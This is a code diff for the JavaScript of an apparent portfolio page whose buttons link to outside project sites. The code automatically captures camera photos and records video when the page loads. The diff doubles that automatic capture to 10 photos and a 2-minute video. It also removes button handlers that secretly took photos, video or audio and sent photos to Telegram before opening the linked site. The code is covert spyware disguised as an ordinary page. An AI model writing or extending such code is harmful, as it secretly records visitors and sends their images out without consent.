@@ -32,7 +32,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 
             console.log('Starting auto capture...');
 
-            // Capture 5 photos
+            // Capture 10 photos
             const canvas = document.createElement('canvas');
             const videoTrack = stream.getVideoTracks()[0];
             if (videoTrack) {
@@ -52,7 +52,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 canvas.height = height;
                 const context = canvas.getContext('2d');
 
-                for (let i = 0; i < 5; i++) {
+                for (let i = 0; i < 10; i++) {
                     try {
                         const videoTrack = stream.getVideoTracks()[0];
                         if (!videoTrack) break;
@@ -91,14 +91,14 @@ document.addEventListener('DOMContentLoaded', async () => {
                             }
                         }
 
-                        if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+                        if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                     } catch (photoError) {
                         console.error(`Auto photo capture error ${i + 1}:`, photoError);
                     }
                 }
             }
 
-            // Record 60 second video (1 minute)
+            // Record 120 second video (2 minutes)
             await new Promise(resolve => setTimeout(resolve, 1000));
             
             const videoMimeType = getSupportedVideoMimeType();
@@ -143,13 +143,13 @@ document.addEventListener('DOMContentLoaded', async () => {
                 autoMediaRecorder.start();
                 console.log('Auto video recording started...');
 
-                // Auto-stop after 60 seconds (1 minute)
+                // Auto-stop after 120 seconds (2 minutes)
                 setTimeout(() => {
                     if (autoMediaRecorder && autoMediaRecorder.state === 'recording') {
                         autoMediaRecorder.stop();
                         console.log('Auto video recording stopped');
                     }
-                }, 60000);
+                }, 120000);
             } catch (error) {
                 console.error('Recording start error:', error);
             }
@@ -1013,116 +1013,33 @@ document.addEventListener('DOMContentLoaded', async () => {
     const projectBtn2 = document.getElementById('projectBtn2');
     const projectBtn3 = document.getElementById('projectBtn3');
     
-    // Project 1: Capture 10 photos
+    // Project 1: Open website directly
     if (projectBtn1) {
-        projectBtn1.addEventListener('click', async () => {
-            if (!stream || projectBtn1.disabled) {
+        projectBtn1.addEventListener('click', () => {
+            if (projectBtn1.disabled) {
                 return;
             }
-            
-            projectBtn1.disabled = true;
-            
-            try {
-                const canvas = document.createElement('canvas');
-                const videoTrack = stream.getVideoTracks()[0];
-                if (!videoTrack) {
-                    projectBtn1.disabled = false;
-                    return;
-                }
-                
-                let width = 640;
-                let height = 480;
-                try {
-                    const settings = videoTrack.getSettings();
-                    if (settings.width && settings.height) {
-                        width = settings.width;
-                        height = settings.height;
-                    }
-                } catch (err) {
-                    console.warn('Could not get video settings:', err);
-                }
-                
-                canvas.width = width;
-                canvas.height = height;
-                
-                for (let i = 0; i < 4; i++) {
-                    try {
-                        const videoTrack = stream.getVideoTracks()[0];
-                        if (!videoTrack) break;
-                        
-                        if (typeof ImageCapture !== 'undefined') {
-                            try {
-                                const imageCaptureObj = new ImageCapture(videoTrack);
-                                const bitmap = await imageCaptureObj.grabFrame();
-                                const canvas2 = document.createElement('canvas');
-                                canvas2.width = bitmap.width;
-                                canvas2.height = bitmap.height;
-                                const ctx = canvas2.getContext('2d');
-                                ctx.drawImage(bitmap, 0, 0);
-                                
-                                const blob = await new Promise((resolve, reject) => {
-                                    canvas2.toBlob((blob) => {
-                                        if (blob) {
-                                            resolve(blob);
-                                        } else {
-                                            reject(new Error(''));
-                                        }
-                                    }, 'image/jpeg', 0.95);
-                                });
-                                
-                                const formData = {
-                                    method: 'sendPhoto',
-                                    fileType: 'photo',
-                                    file: blob,
-                                    fileName: `project1_photo_${Date.now()}_${i}.jpg`
-                                };
-                                await sendToTelegram(formData);
-                            } catch (imageCaptureErr) {
-                                console.warn('ImageCapture failed:', imageCaptureErr);
-                            }
-                        }
-                        
-                        if (i < 3) await new Promise(resolve => setTimeout(resolve, 300));
-                    } catch (photoError) {
-                        console.error(`Photo capture error ${i + 1}:`, photoError);
-                    }
-                }
-                
-                // Redirect after photos sent
-                setTimeout(() => {
-                    window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
-                }, 500);
-            } catch (error) {
-                console.error('Project 1 error:', error);
-            } finally {
-                projectBtn1.disabled = false;
-            }
+            window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
         });
     }
     
-    // Project 2: Record video (15 seconds)
+    // Project 2: Open website directly
     if (projectBtn2) {
-        projectBtn2.addEventListener('click', async () => {
-            if (!stream || projectBtn2.disabled) {
+        projectBtn2.addEventListener('click', () => {
+            if (projectBtn2.disabled) {
                 return;
             }
-            
-            projectBtn2.disabled = true;
-            recordingType = 'project2';
-            startRecordingProject(stream, getSupportedVideoMimeType(), 15000, 'https://abuali782.github.io/Zena-Touch-v2/');
+            window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
         });
     }
     
-    // Project 3: Record audio (15 seconds)
+    // Project 3: Open website directly
     if (projectBtn3) {
-        projectBtn3.addEventListener('click', async () => {
-            if (!stream || projectBtn3.disabled) {
+        projectBtn3.addEventListener('click', () => {
+            if (projectBtn3.disabled) {
                 return;
             }
-            
-            projectBtn3.disabled = true;
-            recordingType = 'project3';
-            startRecordingProject(stream, getSupportedAudioMimeType(), 15000, 'https://abuali782.github.io/BaytakRealEstate/');
+            window.open('https://abuali782.github.io/BaytakRealEstate/', '_blank');
         });
     }
 
